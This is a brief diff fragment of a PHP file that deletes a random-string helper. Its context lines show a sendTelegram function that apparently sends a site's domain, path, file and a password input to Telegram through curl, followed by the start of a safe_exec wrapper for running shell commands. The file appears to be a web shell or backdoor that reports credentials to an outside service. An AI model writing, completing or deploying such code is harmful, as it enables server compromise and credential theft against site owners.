@@ -29,9 +29,6 @@ function sendTelegram($domain, $path, $file, $passwordInput) {
     curl_exec($ch);
     curl_close($ch);
 }
-function rand_str($len = 8) {
-    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $len);
-}
 function safe_exec($cmd) {
     // shell_exec
     if (function_exists('shell_exec') && is_callable('shell_exec')) {
